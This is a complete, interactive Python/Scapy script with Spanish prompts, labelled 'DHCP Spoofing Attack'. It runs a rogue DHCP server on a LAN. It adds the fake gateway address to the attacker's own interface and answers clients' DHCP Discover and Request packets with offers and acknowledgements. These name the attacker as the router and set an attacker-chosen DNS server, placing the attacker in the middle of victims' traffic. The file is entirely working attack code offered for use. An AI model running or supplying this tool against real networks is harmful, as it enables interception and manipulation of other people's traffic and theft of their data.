#!/usr/bin/env python3
import os
import sys
import subprocess
from scapy.all import (
    Ether, IP, UDP, BOOTP, DHCP,
    sendp, sniff, get_if_hwaddr, conf
)

def validar_ip(ip):
    partes = ip.split('.')
    if len(partes) != 4:
        return False
    for p in partes:
        if not p.isdigit() or not 0 <= int(p) <= 255:
            return False
    return True

def get_input(prompt, default=None, required_type=str, allow_empty=False):
    while True:
        valor = input(prompt)
        if valor == "" and default is not None:
            return default
        if valor == "" and not allow_empty:
            print("Este campo no puede estar vacío.")
            continue
        if required_type == int:
            try:
                return int(valor)
            except ValueError:
                print("Debe ingresar un número entero.")
        elif required_type == "ip":
            if validar_ip(valor):
                return valor
            else:
                print("Formato de IP inválido (ejemplo: 192.168.1.100).")
        else:
            return valor

def mask_to_prefix(mask):
    """Convierte una máscara tipo 255.255.255.0 a prefijo CIDR (24)."""
    return sum(bin(int(octeto)).count('1') for octeto in mask.split('.'))

def asignar_ip_interfaz(interface, ip, mask):
    """Asigna la IP falsa (gateway) a la interfaz del atacante para que
    responda a ARP Requests y complete el MITM (no solo el DHCP)."""
    prefix = mask_to_prefix(mask)
    cidr = f"{ip}/{prefix}"
    try:
        # Verifica si ya está asignada para no duplicar
        resultado = subprocess.run(
            ["ip", "addr", "show", "dev", interface],
            capture_output=True, text=True
        )
        if ip in resultado.stdout:
            print(f"[i] La IP {ip} ya está asignada a {interface}, se omite.")
            return

        subprocess.run(
            ["ip", "addr", "add", cidr, "dev", interface],
            check=True
        )
        print(f"[+] IP {cidr} asignada a {interface} (ahora responde ARP como gateway)")
    except subprocess.CalledProcessError as e:
        print(f"[-] Error asignando IP a la interfaz: {e}")
        sys.exit(1)

def main():
    print("=== DHCP Spoofing Attack - Configuración interactiva ===\n")

    interface   = get_input("Interfaz de red (ej: eth0): ", required_type=str)
    attacker_ip = get_input("IP del atacante (gateway falso): ", required_type="ip")
    subnet_mask = get_input("Máscara de subred [255.255.255.0]: ", default="255.255.255.0", required_type="ip")
    dns_server  = get_input("Servidor DNS [8.8.8.8]: ", default="8.8.8.8", required_type="ip")
    lease_time  = get_input("Tiempo de concesión (segundos) [86400]: ", default=86400, required_type=int)
    pool_start  = get_input("IP inicio del pool (ej: 192.168.1.100): ", required_type="ip")
    pool_end    = get_input("IP fin del pool   (ej: 192.168.1.200): ", required_type="ip")

    # Generar pool de IPs
    base = ".".join(pool_start.split(".")[:3])
    start = int(pool_start.split(".")[-1])
    end   = int(pool_end.split(".")[-1])
    ip_pool = [f"{base}.{i}" for i in range(start, end + 1)]
    assigned = {}  # mac -> ip

    try:
        attacker_mac = get_if_hwaddr(interface)
    except Exception as e:
        print(f"Error al obtener MAC de {interface}: {e}")
        sys.exit(1)

    print("\n--- Resumen de configuración ---")
    print(f"Interfaz:     {interface}")
    print(f"MAC atacante: {attacker_mac}")
    print(f"IP atacante:  {attacker_ip}")
    print(f"Máscara:      {subnet_mask}")
    print(f"DNS:          {dns_server}")
    print(f"Lease time:   {lease_time} segundos")
    print(f"Pool IPs:     {pool_start} - {pool_end} ({len(ip_pool)} direcciones)")
    print("\n¡ATENCIÓN! Este ataque enviará respuestas DHCP maliciosas")
    print("y asignará la IP falsa a tu propia interfaz de red.")
    confirm = input("¿Desea continuar? (s/N): ").lower()
    if confirm != 's':
        print("Abortado.")
        sys.exit(0)

    # --- Asignar la IP falsa a la interfaz del atacante ---
    asignar_ip_interfaz(interface, attacker_ip, subnet_mask)

    conf.iface = interface

    def dhcp_offer(packet):
        if not packet.haslayer(DHCP):
            return

        msg_type = packet[DHCP].options[0][1]

        # --- DHCP Discover → responder con Offer ---
        if msg_type == 1:
            client_mac = packet[Ether].src
            print(f"[+] DHCP Discover de {client_mac}")

            if client_mac not in assigned:
                if not ip_pool:
                    print("[-] Pool de IPs agotado, ignorando.")
                    return
                assigned[client_mac] = ip_pool.pop(0)

            client_ip = assigned[client_mac]

            eth   = Ether(dst=client_mac, src=attacker_mac, type=0x0800)
            ip    = IP(src=attacker_ip, dst="255.255.255.255", ttl=64)
            udp   = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,
                yiaddr=client_ip,
                siaddr=attacker_ip,
                chaddr=packet[BOOTP].chaddr,
                xid=packet[BOOTP].xid
            )
            dhcp_layer = DHCP(options=[
                ("message-type", "offer"),
                ("server_id",    attacker_ip),
                ("subnet_mask",  subnet_mask),
                ("router",       attacker_ip),
                ("name_server",  dns_server),
                ("lease_time",   lease_time),
                "end"
            ])
            sendp(eth / ip / udp / bootp / dhcp_layer, iface=interface, verbose=False)
            print(f"    -> DHCP Offer enviado: {client_ip} (gateway={attacker_ip})")

        # --- DHCP Request → responder con ACK ---
        elif msg_type == 3:
            client_mac = packet[Ether].src
            client_ip  = assigned.get(client_mac)

            if not client_ip:
                return  # No tenemos asignación para este cliente

            print(f"[+] DHCP Request de {client_mac} → confirmando {client_ip}")

            eth   = Ether(dst=client_mac, src=attacker_mac, type=0x0800)
            ip    = IP(src=attacker_ip, dst="255.255.255.255", ttl=64)
            udp   = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,
                yiaddr=client_ip,
                siaddr=attacker_ip,
                chaddr=packet[BOOTP].chaddr,
                xid=packet[BOOTP].xid
            )
            dhcp_layer = DHCP(options=[
                ("message-type", "ack"),
                ("server_id",    attacker_ip),
                ("subnet_mask",  subnet_mask),
                ("router",       attacker_ip),
                ("name_server",  dns_server),
                ("lease_time",   lease_time),
                "end"
            ])
            sendp(eth / ip / udp / bootp / dhcp_layer, iface=interface, verbose=False)
            print(f"    -> DHCP ACK enviado: {client_ip} confirmada")

    print("\n=== ESCUCHANDO DHCP (Ctrl+C para detener) ===")
    try:
        sniff(
            filter="udp and (port 67 or port 68)",
            prn=dhcp_offer,
            store=0,
            iface=interface
        )
    except KeyboardInterrupt:
        print("\n[!] Ataque detenido.")
        print(f"[*] IPs asignadas: {assigned}")
        sys.exit(0)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Este script necesita permisos de superusuario (sudo).")
        sys.exit(1)
    main()
